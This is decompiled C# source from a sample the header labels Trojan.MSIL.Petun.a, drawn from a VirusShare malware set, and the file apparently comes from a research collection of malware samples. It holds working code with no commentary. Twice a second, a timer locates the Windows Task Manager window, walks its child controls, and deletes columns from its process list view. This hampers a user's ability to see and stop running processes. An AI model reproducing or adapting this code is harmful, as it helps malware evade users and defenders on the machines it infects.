// Decompiled with JetBrains decompiler
// Type: CZUxyf
// Assembly: expllorer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D3216EC4-8422-418D-B6EB-DD3FFAFAEBBB
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Trojan.MSIL.Petun.a-1e6fbdfcca16ae539faf4e069c7741dea58582b03e67f64e284b5fe71183db9a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class CZUxyf
{
  private const int LVM_FIRST = 4096;
  private const int LVM_DELETECOLUMN = 4124;
  private static Timer t = new Timer();

  [DllImport("user32", EntryPoint = "SendMessageA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int SendMessage(IntPtr Hwnd, int wMsg, int wParam, int lParam);

  [DllImport("user32.dll", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int EnumChildWindows(
    IntPtr hWndParent,
    CZUxyf.EnumDelegate lpEnumFunc,
    int lParam);

  [DllImport("user32.dll", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern long GetClassName(long hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, long nMaxCount);

  [DllImport("user32", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

  [DllImport("user32", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);

  [DllImport("user32", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetWindowTextLength(IntPtr hWnd);

  private static void t_Tick(object sender, EventArgs e)
  {
    string str1 = (string) null;
    ref string local1 = ref str1;
    string str2 = "Windows Task Manager";
    ref string local2 = ref str2;
    IntPtr window = (IntPtr) CZUxyf.FindWindow(ref local1, ref local2);
    if (!(window != (IntPtr) 0))
      return;
    CZUxyf.EnumChildWindows(window, new CZUxyf.EnumDelegate(CZUxyf.EnumChildWindows), 0);
  }

  public static bool Running
  {
    get => CZUxyf.t.Enabled;
    set
    {
      if (value)
      {
        if (CZUxyf.t.Interval != 500)
        {
          Timer t = CZUxyf.t;
          CZUxyf.t.Tick += new EventHandler(CZUxyf.t_Tick);
          t.Interval = 500;
          t.Enabled = true;
          t.Start();
        }
        else
        {
          CZUxyf.t.Enabled = true;
          CZUxyf.t.Start();
        }
      }
      else
      {
        CZUxyf.t.Enabled = false;
        CZUxyf.t.Stop();
      }
    }
  }

  private static int EnumChildWindows(IntPtr lngHwnd, int lngLParam)
  {
    string str = CZUxyf.GetClass(lngHwnd);
    string titleText = CZUxyf.GetTitleText(lngHwnd);
    lngHwnd.ToString() + ", " + str + ", " + titleText;
    return 1;
  }

  private static string GetClass(IntPtr handle)
  {
    StringBuilder lpClassName = new StringBuilder();
    lpClassName.Length = (int) byte.MaxValue;
    CZUxyf.GetClassName(handle, lpClassName, lpClassName.Length);
    if (Strings.InStr(lpClassName.ToString(), "SysListView32") != 0)
      CZUxyf.SendMessage(handle, 4124, (int) (IntPtr) 0, 0);
    return lpClassName.ToString();
  }

  private static string GetTitleText(IntPtr handle)
  {
    StringBuilder lpString = new StringBuilder();
    lpString.Length = checked (CZUxyf.GetWindowTextLength(handle) + 1);
    CZUxyf.GetWindowText(handle, lpString, lpString.Length);
    return lpString.ToString();
  }

  private delegate int EnumDelegate(IntPtr lngHwnd, int lngLParam);
}
